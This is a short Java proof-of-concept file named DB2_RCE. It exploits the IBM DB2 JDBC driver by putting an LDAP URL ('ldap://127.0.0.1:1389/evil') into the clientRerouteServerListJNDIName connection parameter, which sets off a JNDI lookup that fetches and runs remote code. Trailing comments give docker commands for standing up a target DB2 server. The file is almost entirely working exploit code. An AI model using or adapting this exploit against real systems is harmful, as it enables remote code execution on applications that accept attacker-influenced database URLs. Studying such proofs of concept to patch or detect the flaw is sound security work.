package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

// Test in MacOS
// OpenJDK 22
public class DB2_RCE {
    public static void main(String[] args) throws Exception {
        String driver = "com.ibm.db2.jcc.DB2Driver";
        String Payload_url = "ldap://127.0.0.1:1389/evil";
        String DB_URL = "jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=" + Payload_url + ";";
        System.out.println(DB_URL);
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
        conn.close();
    }
}

// docker pull ibmoms/db2express-c
// docker run -itd --name db2 --privileged=true -p 50000:50000 -e DB2INST1_PASSWORD=db2admin -e LICENSE=accept ibmoms/db2express-c db2start